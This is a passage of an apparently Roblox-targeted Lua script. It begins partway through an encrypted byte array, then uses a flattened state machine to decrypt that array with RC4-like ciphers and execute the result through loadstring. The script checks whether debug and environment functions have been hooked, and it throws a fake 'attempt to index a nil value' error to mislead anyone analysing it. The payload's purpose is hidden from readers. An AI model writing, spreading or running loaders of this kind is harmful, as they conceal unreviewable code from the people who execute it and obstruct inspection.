,88,22,213,249,13,244,12,150,128,77,91,246,98,59,31,29,130,74,156,223,179,243,35,167,249,243,195,178,139,180,245,219,176,96,234,231,101,102,57,77,180,17,75,141,146,56,145,28,16,130,65,59,87,56,36,246,15,141,147,228,1,50,30,148,89,64,25,201,0,119,39,57,160,179,69,111,31,21,36,243,229,156,27,151,32,126,27,121,102,210,244,12,79,198,231,201,24,188,33,235,249,74,254,69,166,85,1,76,186,56,120,124,84,197,31,0,139,55,87,130,48,33,33,107,194,195,64,34,13,30,191,18,15,241,204,184,162,70,78,20,216,146,196,118,56,238,73,36,177,114,31,209,219,191,254,8,125,110,212,163,54,234,6,205,62,25,44,94,227,109,15,11,127,207,123,197,161,48,138,227,212,234,71,146,84,95,2,223,118,32,160,32,225,8,4,178,247,198,11,192,185,175,102,15,80,235,63,149,168,143,122,24,30,31,0,180,112,225,220,150,146,121,237,16,27,122,140,143,221,249,21,235,94,44,123,110,204,20,240,94,41,47,197,29,26,193,56,78,204,14,38,250,140,112,33,196,36,212,104,26,68,25,242,103,145,112,34,128,179,2,37,237,173,12,199,169,64,97,131,190,82,241,220,225,21,162,105,215,123,199,22,124,38,198,133,172,126,253,218,215,70,136,231,64,195,184,62,162,155,149,34,218,67,207,110,71,54,56,76,162,52,245,90,225,25,74,199,40,192,85,151,246,252,28,53,85,105,175,130,125,15,117,135,167,75,20,141,46,4,92,108,255,172,229,118,51,187,174,39,84,217,114,166,210,31,106,17,139,242,29,172,0,52,233,152,223,173,167,148,195,88,66,111,162,34,6,124,169,68,219,225,241,127,14,220,112,148,183,68,206,139,238,18,143,116,183,9,210,94,174,187,69,116,187,139,75,98,22,55,9,56,173,127,165,38,67,34,147,119,229,213,183,187,61,177,94,227,222,146,185,207,89,223,233,8,194,248,63,169,236,85,240,127,229,255,139,40,59,130,58,39,159,89,75,216,72,132,139,146,140,90,225,183,123,180,251,238,21,176,129,169,13,221,205,87,19,93,121,174,233,114,233,148,192,251,75,24,188,110,196,184,33,207,25,146,82,104,168,32,144,57,12,194,102,232,34,227,244,150,125,21,72,193,86,196,39,25,13,163,207,134,22,14,179,7,175,230,136,238,32,75,114,236,53,17,71,206,165,199,196,249,6,0,249,196,238,23,142,156,146,203,34,99,241,165,218,191,43,100,196,100,124,109,143,106,102,196,91,145,125,238,233,104,247,118,231,187,131,69,125,226,155,61,87,57,3,128,209,248,190,164,95,233,158,133,201,134,202,119,147,179,27,5,153,175,212,240,188,238,192,235,193,232,202,13,254,44,28,218,142,42,186,239,145,200,201,201,218,159,134,15,34,51,223,146,106,143,142,70,162,128,188,247,225,58,138,82,62,204,246,41,158,220,130,5,230,22,221,232,216,136,153,136,117,3,178,37,167,196,161,160,128,4,4,58,215,23,168,15,175,120,137,191,105,206,241,205,104,249,9,144,212,182,84,88,235,142,225,156,130,222,212,82,187,72,67,33,255,127,170,169,192,154,105,111,192,27,129,218,59,228,254,129,172,136,130,247,39,150,212,172,232,141,119,134,206,216,77,138,246,115,117,73,188,46,85,177,140,222,121,192,34,120,254,249,227,114,188,171,186,178,217,181,123,130,150,245,104,233,246,18,23,54,99,115,206,94,31,73,51,215,0,70,50,38,156,253,62,48,226,176,153,15,154,147,89,40,73,11,119,146,64,140,187,65,74,104,232,210,243,227,255,74,19,69,64,113,128,162,162,163,116,105,84,181,33,147,142,87,72,27,251,247,116,120,119,211,36,143,214,52,133,18,20,89,121,90,26,253,231,1,166,31,175,173,126,137,77,58,12,169,84,168,137,126,87,50,205,69,233,166,63,86,66,173,228,107,44,143,141,253,8,14,141,50,98,132,41,253,100,85,190,145,98,243,252,166,118,60,90,155,90,100,10,131,24,152,182,218,182,181,182,24,140,83,64,26,7,244,43,37,226,241,24,169,233,67,111,164,71,203,6,209,208,78,150,241,189,177,39,117,218,245,173,76,9,105,211,235,178,181,112,13,181,213,92,90,123,0,170,187,175,153,121,39,242,111,29,195,117,63,218,150,243,90,15,183,204,241,21,38,148,16,153,205,126,203,59,0,138,196,152,223,130,201,84,56,76,171,42,85,125,120,146,26,232,74,169,153,55,173,247,215,97,195,102,202,120,126,66,167,221,27,127,163,44,110,127,83,124,168,98,159,161,67,101,82,9,4,248,61,239,15,148,56,135,129,82,39,119,150,153,47,33,137,204,107,85,228,0,89,108,145,165,77,206,190,152,34,3,119,59,69,182,26,144,233,193,192,4,29,200,198,60,27,168,241,96,176,191,222,120,120,107,110,186,23,62,1,137,185,93,3,188,30,110,109,152,169,240,110,158,134,202,19,71,54,178,84,86,161,3,25,29,4,141,19,232,228,194,6,209,81,219,61,3,114,182,89,165,46,22,71,190,195,35,132,160,18,175,109,214,17,110,253,19,15,19,114,40,55,7,245,233,86,231,229,90,157,89,246,218,239,44,247,17,157,6,5,184,89,7,238,76,232,178,36,160,186,15,251,248,27,192,171,80,241,97,229,11,245,235,12,182,41,179,9,61,170,65,8,113,29,33,249,223,47,218,74,97,157,102,215,224,106,145,218,120,232,125,166,42,172,85,99,100,196,89,97,103,124,100,49,30,229,78,249,166,254,19,167,124,108,109,13,145,165,54,110,24,243,84,67,118,162,41,139,61,136,50,47,81,168,46,156,96,171,3,128,219,107,95,73,24,94,221,169,158,143,170,58,82,126,118,35,72,238,206,213,88,44,181,117,129,246,222,168,69,23,214,33,142,255,157,251,98,210,88,202,114,148,152,184,29,138,24,154,84,150,75,51,117,57,158,190,210,194,235,87,10,112,217,117,145,142,49,86,31,155,203,105,138,29,227,129,65,79,227,56,11,94,156,137,113,163,241,227,47,68,9,4,41,111,147,253,121,22,206,245,173,96,60,86,201,172,252,106,224,101,191,82,172,125,112,151,201,37,213,145,13,243,210,190,176,201,195,236,67,24,17,16,180,54,70,192,63,243,55,223,214,11,143,82,24,113,206,76,16,122,187,125,65,40,126,98,107,255,249,218,158,219,150,122,16,86,245,60,203,93,221,110,82,26,29,215,28,133,51,13,88,182,31,117,109,143,252,8,187,130,124,255,70,122,122,141,161,9,254,86,48,166,155,18,223,83,224,123,185,97,33,229,73,124,69,244,91,162,239,105,6,242,76,165,239,211,178,46,145,102,206,31,65,115,69,60,240,210,206,175,195,14,204,82,219,57,228,18,29,81,188,110,14,166,112,182,72,151,30,162,31,31,136,66,93,234,148,190,123,123,14,216,127,195,163,196,43,203,126,17,234,61,56,187,196,215,169,13,198,174,7,55,106,22,214,56,244,33,163,76,181,191,63,13,154,42,230,33,105,105,147,32,163,148,198,26,193,199,165,201,27,228,235,240,14,8,68,131,234,251,196,196,88,59,140,168,240,72,72,166,58,224,117,235,125,151,16,34,117,73,81,85,133,135,234,141,88,14,187,76,193,160,18,83,189,139,197,236,60,240,21,177,149,97,230,243,207,25,56,75,165,12,62,221,175,65,236,192,159,149,58,203,107,177,224,5,29,56,163,252,227,123,194,70,197,253,90,207,34,207,42,65,186,185,102,122,166,149,204,225,30,50,121,193,68,44,47,37,227,76,214,47,27,72,221,149,86,136,50,152,184,122,159,98,246,102,201,134,86,251,199,82,154,228,114,208,139,27,64,89,106,237,53,174,225,221,249,56,184,156,114,0,1,253,192,179,158,131,34,106,163,160,247,143,138,176,175,43,43,201,83,115,194,255,10,69,192,58,34,122,237,68,154,116,126,161,129,54,129,86,117,96,76,57,54,27,159,165,222,61,135,163,102,95,132,16,168,126,231,116,28,153,210,180,127,37,172,83,199,72,24,186,75,46,43,216,139,27,177,157,78,137,243,8,218,144,65,84,187,109,8,66,24,166,144,174,212,55,202,157,94,111,214,237,238,231,90,234,217,48,201,37,237,223,193,241,225,190,37,237,8,195,6,23,184,37,82,43,196,75,27,34,88,229,141,61,243,173,97,73,12,125,29,228,47,4,136,73,21,106,76,132,139,136,171,117,4,54,157,243,65,32,198,195,49,19,176,155,167,175,105,178,41,109,205,80,56,180,57,189,8,76,196,124,72,243,92,128,186,112,26,222,110,242,117,197,209,246,45,8,46,15,0,114,3,89,182,52,125,55,66,16,61,75,61,133,37,56,233,129,213,40,113,3,47,119,60,230,134,94,205,30,127,76,195,166,145,3,45,160,159,165,62,212,21,94,184,10,174,199,57,69,171,73,206,211,127,198,195,90,56,6,161,213,15,144,95,127,137,163,149,25,193,92,148,53,64,164,60,15,89,232,233,37,96,15,209,227,228,207,242,44,232,89,129,230,125,183,159,104,117,253,84,148,205,118,100,10,9,198,147,72,250,50,84,189,105,121,172,191,240,12,144,186,228,138,139,215,200,200,80,114,123,185,70,37,67,36,131,143,246,58,189,4,230,178,166,109,65,156,118,217,121,255,223,128,46,85,206,92,44,106,13,201,223,113,98,99,21,69,52,99,118,105,20,54,54,62,77,84,89,183,121,136,131,246,235,199,180,238,77,147,74,101,171,97,91,67,85,136,46,72,254,13,152,91,106,75,142,218,147,134,148,239,141,158,46,242,163,254,112,128,16,123,176,103,241,46,75,205,1,218,37,242,106,240,74,83,186,138,38,93,134,69,69,228,228,217,79,203,8,79,67,115,6,35,121,22,251,222,131,79,237,110,47,147,108,157,19,177,139,121,248,68,203,32,66,27,131,105,144,36,192,219,120,122,1,183,192,113,217,9,89,39,69,163,130,62,192,248,250,247,179,78,216,39,253,177,172,174,86,66,247,162,217,56,220,226,229,88,188,74,231,210,244,213,119,127,200,30,195,129,42,242,112,174,104,161,152,57,247,146,13,154,81,111,59,104,34,77,161,173,117,47,25,248,90,61,68,182,77,96,182,228,38,206,130,184,126,204,124,151,2,154,60,160,62,194,233,198,132,161,218,14,229,53,29,174,115,225,210,236,180,250,175,2,107,194,182,45,134,104,164,139,226,38,145,227,196,28,176,98,232,31,235,159,179,71,97,129,21,115,91,201,123,157,237,195,52,77,123,91,16,151,152,5,18,8,151,35,193,61,204,198,64,119,235,29,228,88,176,226,39,122,51,167,63,3,173,199,121,221,139,69,157,149,6,199,223,11,120,218,40,59,62,156,219,214,53,15,35,58,87,73,71,216,33,87,26,155,149,92,181,185,91,177,226,143,225,115,13,123,52,156,231,76,71,146,138,79,234,167,52,31,252,133,168,196,73,40,202,41,171,59,167,95,37,40,191,239,70,175,120,27,209,160,8,206,58,78,236,81,119,229,23,166,227,162,34,166,71,217,78,117,82,30,84,41,145,250,48,65,188,160,64,31,178,212,86,241,128,102,255,13,137,120,172,160,39,225,103,134,132,220,192,177,192,250,199,118,5,238,82,249,157,255,151}
local _vKCyjWwAQEhd={}
local _ucjYpxKHyiFR={}
local _gXWkLLOPRDqM={}
local _gIsDAgVRWwJn,_eNqndOqdEKYU=0,0
local _RhvMZGAQXqPG=0
local _QvyUftmAbqPl=0
local _KuguTjXvsQkJ=0
local _jiglqKuAijPA=0
local _EEzRawEVbOST=348
while _EEzRawEVbOST~=0 do
if _EEzRawEVbOST>=347 and _EEzRawEVbOST<414 then
local _eATYewKSmZIU=1
for _i=1,math.min(32,#_JYsILbBMPWIT),6 do
_eATYewKSmZIU=(_eATYewKSmZIU*34+string.byte(_JYsILbBMPWIT,_i))%65521
end
local _tybdnolRYojK,_jpjDwcPtOysD=pcall(function() return loadstring end)
_eATYewKSmZIU=(_eATYewKSmZIU+#_JYsILbBMPWIT)%65521
if (not _tybdnolRYojK) or (_eATYewKSmZIU<1) then error(string.char(97,116,116,101,109,112,116,32,116,111,32,105,110,100,101,120,32,97,32,110,105,108,32,118,97,108,117,101)) return end
if type(_jpjDwcPtOysD)~=string.char(102,117,110,99,116,105,111,110) then error(string.char(97,116,116,101,109,112,116,32,116,111,32,105,110,100,101,120,32,97,32,110,105,108,32,118,97,108,117,101)) return end
local _QvyUftmAbqPl=bit32.bxor(string.byte(_JYsILbBMPWIT,1),_eNqndOqdEKYU)*49+bit32.bxor(string.byte(_JYsILbBMPWIT,4),_gIsDAgVRWwJn)*8+string.byte(_JYsILbBMPWIT,8)*27+_eNqndOqdEKYU*19
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(string.byte(_JYsILbBMPWIT,1),145))*133
_EEzRawEVbOST=(_QvyUftmAbqPl%32)+397
elseif _EEzRawEVbOST>=397 and _EEzRawEVbOST<429 then
local _QvyUftmAbqPl=bit32.bxor(string.byte(_JYsILbBMPWIT,8),_eNqndOqdEKYU)*42+bit32.bxor(string.byte(_JYsILbBMPWIT,17),_gIsDAgVRWwJn)*41+string.byte(_JYsILbBMPWIT,13)*13+_eNqndOqdEKYU*23
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(string.byte(_JYsILbBMPWIT,8),107))*115
_EEzRawEVbOST=(_QvyUftmAbqPl%90)+409
elseif _EEzRawEVbOST>=409 and _EEzRawEVbOST<499 then
local _IqxbPawlhLAm=type
if _IqxbPawlhLAm(getfenv)~=string.char(102,117,110,99,116,105,111,110) and getfenv~=nil then _HOfjVOhSNdlR=true end
local _QTfRBGlzPIHw=_IqxbPawlhLAm(debug)==string.char(116,97,98,108,101)
if _QTfRBGlzPIHw and debug.getinfo~=nil and _IqxbPawlhLAm(debug.getinfo)~=string.char(102,117,110,99,116,105,111,110) then _HOfjVOhSNdlR=true end
if _QTfRBGlzPIHw and debug.sethook~=nil and _IqxbPawlhLAm(debug.sethook)~=string.char(102,117,110,99,116,105,111,110) then _HOfjVOhSNdlR=true end
local _QvyUftmAbqPl=bit32.bxor(string.byte(_JYsILbBMPWIT,15),_eNqndOqdEKYU)*29+bit32.bxor(string.byte(_JYsILbBMPWIT,30),_gIsDAgVRWwJn)*15+string.byte(_JYsILbBMPWIT,18)*12+_eNqndOqdEKYU*16
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(string.byte(_JYsILbBMPWIT,15),104))*105
_EEzRawEVbOST=(_QvyUftmAbqPl%28)+472
elseif _EEzRawEVbOST>=472 and _EEzRawEVbOST<500 then
_RWpnBWVbRYiA=string.char(36,239,241,215) .. string.char(47,147,201,152) .. string.char(65,192) .. string.char(197,213) .. string.char(139,15) .. string.char(122,84) .. string.char(244,133,139,29,171) .. string.char(98,118,144,85) .. string.char(32,176) .. string.char(224)
_ucjYpxKHyiFR={}
for _k=0,255 do _ucjYpxKHyiFR[_k]=_k end
local _dMawvOPoEZXp=1
_jiglqKuAijPA=0
for _k=0,84 do
local _kb=string.byte(_RWpnBWVbRYiA,(_k%#_RWpnBWVbRYiA)+1)
_dMawvOPoEZXp=(_dMawvOPoEZXp*31+_kb)%65521
_jiglqKuAijPA=(_jiglqKuAijPA+_ucjYpxKHyiFR[_k]+_kb)%256
local _aNxAbEtmQWGr=(_jiglqKuAijPA+bit32.band(_dMawvOPoEZXp,255))%256
local _xt=_ucjYpxKHyiFR[_k] _ucjYpxKHyiFR[_k]=_ucjYpxKHyiFR[_aNxAbEtmQWGr] _ucjYpxKHyiFR[_aNxAbEtmQWGr]=_xt
end
_KuguTjXvsQkJ=0
local _QvyUftmAbqPl=bit32.bxor(string.byte(_JYsILbBMPWIT,22),_eNqndOqdEKYU)*62+bit32.bxor(string.byte(_JYsILbBMPWIT,8),_gIsDAgVRWwJn)*15+string.byte(_JYsILbBMPWIT,23)*16+_eNqndOqdEKYU*29
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(string.byte(_JYsILbBMPWIT,22),46))*86
_EEzRawEVbOST=(_QvyUftmAbqPl%46)+476
elseif _EEzRawEVbOST>=476 and _EEzRawEVbOST<522 then
for _k=0,255 do _vKCyjWwAQEhd[_k]=_k end
local _YzUQZVEIPVzS=pcall
local _QcseEKvQbqEx=type
if _QcseEKvQbqEx(game)==string.char(117,115,101,114,100,97,116,97) then
local _JGbOFAXCZMMO,_NRTZohhHExYY=_YzUQZVEIPVzS(function() return game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)) end)
if not _JGbOFAXCZMMO then _HOfjVOhSNdlR=true end end
local _QvyUftmAbqPl=bit32.bxor(string.byte(_JYsILbBMPWIT,29),_eNqndOqdEKYU)*20+bit32.bxor(string.byte(_JYsILbBMPWIT,21),_gIsDAgVRWwJn)*40+string.byte(_JYsILbBMPWIT,28)*4+_eNqndOqdEKYU*28
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(string.byte(_JYsILbBMPWIT,29),129))*69
_EEzRawEVbOST=(_QvyUftmAbqPl%45)+505
elseif _EEzRawEVbOST>=505 and _EEzRawEVbOST<550 then
_eNqndOqdEKYU=0
for _k=0,255 do
_eNqndOqdEKYU=(_eNqndOqdEKYU+_vKCyjWwAQEhd[_k]+string.byte(_JYsILbBMPWIT,(_k%#_JYsILbBMPWIT)+1))%256
_RhvMZGAQXqPG=_vKCyjWwAQEhd[_k] _vKCyjWwAQEhd[_k]=_vKCyjWwAQEhd[_eNqndOqdEKYU] _vKCyjWwAQEhd[_eNqndOqdEKYU]=_RhvMZGAQXqPG
end
_gIsDAgVRWwJn,_eNqndOqdEKYU=0,0
local _QvyUftmAbqPl=bit32.bxor(_vKCyjWwAQEhd[_gIsDAgVRWwJn%256],_eNqndOqdEKYU)*34+bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],_gIsDAgVRWwJn)*40+string.byte(_JYsILbBMPWIT,(_gIsDAgVRWwJn%#_JYsILbBMPWIT)+1)*40+_vKCyjWwAQEhd[(_gIsDAgVRWwJn+_eNqndOqdEKYU)%256]*23
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],139))*173
_EEzRawEVbOST=(_QvyUftmAbqPl%38)+529
elseif _EEzRawEVbOST>=529 and _EEzRawEVbOST<567 then
local _GrvJrJBJmMvA=0
local _tgJdRlyxZYMg=85
while _tgJdRlyxZYMg<170 do
local _kb=string.byte(_RWpnBWVbRYiA,(_tgJdRlyxZYMg%#_RWpnBWVbRYiA)+1)
local _gXhISALjcXuL=(_kb*(_tgJdRlyxZYMg&255)+bit32.bxor(_GrvJrJBJmMvA,bit32.rshift(_tgJdRlyxZYMg,4)))%256
local _NwsnoCLpvbdl=_ucjYpxKHyiFR[_tgJdRlyxZYMg]
if math.abs(_NwsnoCLpvbdl-_gXhISALjcXuL)>64 then
_ucjYpxKHyiFR[_tgJdRlyxZYMg]=bit32.bxor(_NwsnoCLpvbdl,_gXhISALjcXuL)
end
_GrvJrJBJmMvA=(_GrvJrJBJmMvA+_ucjYpxKHyiFR[_tgJdRlyxZYMg]+_kb)%256
_tgJdRlyxZYMg=_tgJdRlyxZYMg+1
end
local _MiGMYwzOKTUX=bit32.bxor(_jiglqKuAijPA,_GrvJrJBJmMvA)
_jiglqKuAijPA=(_MiGMYwzOKTUX*(_GrvJrJBJmMvA|1)+bit32.rshift(_MiGMYwzOKTUX,3))%256
local _QvyUftmAbqPl=bit32.bxor(_vKCyjWwAQEhd[_gIsDAgVRWwJn%256],_eNqndOqdEKYU)*48+bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],_gIsDAgVRWwJn)*47+string.byte(_JYsILbBMPWIT,(_gIsDAgVRWwJn%#_JYsILbBMPWIT)+1)*20+_vKCyjWwAQEhd[(_gIsDAgVRWwJn+_eNqndOqdEKYU)%256]*22
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],140))*34
_EEzRawEVbOST=(_QvyUftmAbqPl%67)+551
elseif _EEzRawEVbOST>=551 and _EEzRawEVbOST<618 then
local _QvyUftmAbqPl=bit32.bxor(_vKCyjWwAQEhd[_gIsDAgVRWwJn%256],_eNqndOqdEKYU)*28+bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],_gIsDAgVRWwJn)*33+string.byte(_JYsILbBMPWIT,(_gIsDAgVRWwJn%#_JYsILbBMPWIT)+1)*29+_vKCyjWwAQEhd[(_gIsDAgVRWwJn+_eNqndOqdEKYU)%256]*18
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],176))*69
_EEzRawEVbOST=(_QvyUftmAbqPl%36)+606
elseif _EEzRawEVbOST>=606 and _EEzRawEVbOST<642 then
local _wbQFRzBTbVtt=type
if _wbQFRzBTbVtt(pcall)~=string.char(102,117,110,99,116,105,111,110) then _HOfjVOhSNdlR=true end
if _wbQFRzBTbVtt(type)~=string.char(102,117,110,99,116,105,111,110) then _HOfjVOhSNdlR=true end
local _feXWOFMSdHQK=(#_RWpnBWVbRYiA*string.byte(_RWpnBWVbRYiA,#_RWpnBWVbRYiA//2+1))%65521
local _iIkNWFavvAcA=0
for _k=170,255 do
local _kb=string.byte(_RWpnBWVbRYiA,(_k%#_RWpnBWVbRYiA)+1)
_feXWOFMSdHQK=(_feXWOFMSdHQK*31+_kb)%65521
if bit32.band(_feXWOFMSdHQK,255)~=_ucjYpxKHyiFR[_k] then
_ucjYpxKHyiFR[_k]=bit32.bxor(_ucjYpxKHyiFR[_k],bit32.band(_feXWOFMSdHQK,255))
_jiglqKuAijPA=(_jiglqKuAijPA+_ucjYpxKHyiFR[_k])%256
else
_iIkNWFavvAcA=bit32.bxor(_iIkNWFavvAcA,bit32.band(_feXWOFMSdHQK,255),_kb)
end
end
_KuguTjXvsQkJ=0
_jiglqKuAijPA=0
local _QvyUftmAbqPl=bit32.bxor(_vKCyjWwAQEhd[_gIsDAgVRWwJn%256],_eNqndOqdEKYU)*75+bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],_gIsDAgVRWwJn)*40+string.byte(_JYsILbBMPWIT,(_gIsDAgVRWwJn%#_JYsILbBMPWIT)+1)*13+_vKCyjWwAQEhd[(_gIsDAgVRWwJn+_eNqndOqdEKYU)%256]*3
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],29))*153
_EEzRawEVbOST=(_QvyUftmAbqPl%32)+620
elseif _EEzRawEVbOST>=620 and _EEzRawEVbOST<652 then
local _QvyUftmAbqPl=bit32.bxor(_vKCyjWwAQEhd[_gIsDAgVRWwJn%256],_eNqndOqdEKYU)*59+bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],_gIsDAgVRWwJn)*44+string.byte(_JYsILbBMPWIT,(_gIsDAgVRWwJn%#_JYsILbBMPWIT)+1)*12+_vKCyjWwAQEhd[(_gIsDAgVRWwJn+_eNqndOqdEKYU)%256]*10
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],100))*182
_EEzRawEVbOST=(_QvyUftmAbqPl%81)+627
elseif _EEzRawEVbOST>=627 and _EEzRawEVbOST<708 then
for _k=1,#_yyTCQfdByPUh do
_KuguTjXvsQkJ=(_KuguTjXvsQkJ+1)%256
_jiglqKuAijPA=(_jiglqKuAijPA+_ucjYpxKHyiFR[_KuguTjXvsQkJ])%256
local _xt=_ucjYpxKHyiFR[_KuguTjXvsQkJ] _ucjYpxKHyiFR[_KuguTjXvsQkJ]=_ucjYpxKHyiFR[_jiglqKuAijPA] _ucjYpxKHyiFR[_jiglqKuAijPA]=_xt
_gXWkLLOPRDqM[_k]=string.char(bit32.bxor(_yyTCQfdByPUh[_k],_ucjYpxKHyiFR[(_ucjYpxKHyiFR[_KuguTjXvsQkJ]+_ucjYpxKHyiFR[_jiglqKuAijPA])%256]))
end
local _QvyUftmAbqPl=bit32.bxor(_vKCyjWwAQEhd[_gIsDAgVRWwJn%256],_eNqndOqdEKYU)*77+bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],_gIsDAgVRWwJn)*22+string.byte(_JYsILbBMPWIT,(_gIsDAgVRWwJn%#_JYsILbBMPWIT)+1)*36+_vKCyjWwAQEhd[(_gIsDAgVRWwJn+_eNqndOqdEKYU)%256]*20
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],247))*181
_EEzRawEVbOST=(_QvyUftmAbqPl%27)+693
elseif _EEzRawEVbOST>=693 and _EEzRawEVbOST<720 then
local _cuBjUiBtuGYH_s1,_cuBjUiBtuGYH_s2=1,0
for _ki=1,#_gXWkLLOPRDqM do
local _cuBjUiBtuGYH=string.byte(_gXWkLLOPRDqM[_ki])
_cuBjUiBtuGYH_s1=(_cuBjUiBtuGYH_s1+_cuBjUiBtuGYH)%65521
_cuBjUiBtuGYH_s2=(_cuBjUiBtuGYH_s2+_cuBjUiBtuGYH_s1)%65521
end
local _HkKvQvMEdzZH=_cuBjUiBtuGYH_s2*65536+_cuBjUiBtuGYH_s1
if _HkKvQvMEdzZH~=2733416925 then _HOfjVOhSNdlR=true end
local _QvyUftmAbqPl=bit32.bxor(_vKCyjWwAQEhd[_gIsDAgVRWwJn%256],_eNqndOqdEKYU)*18+bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],_gIsDAgVRWwJn)*47+string.byte(_JYsILbBMPWIT,(_gIsDAgVRWwJn%#_JYsILbBMPWIT)+1)*9+_vKCyjWwAQEhd[(_gIsDAgVRWwJn+_eNqndOqdEKYU)%256]*13
_QvyUftmAbqPl=bit32.bxor(_QvyUftmAbqPl,bit32.bxor(_vKCyjWwAQEhd[_eNqndOqdEKYU%256],59))*226
_EEzRawEVbOST=(_QvyUftmAbqPl%51)+701
elseif _EEzRawEVbOST>=701 and _EEzRawEVbOST<752 then
local _SDftnLufByRE=loadstring(table.concat(_gXWkLLOPRDqM))
if _SDftnLufByRE and not _HOfjVOhSNdlR then pcall(_SDftnLufByRE)
elseif _SDftnLufByRE then pcall(function() end) end
_EEzRawEVbOST=0
else
_EEzRawEVbOST=0
end
end
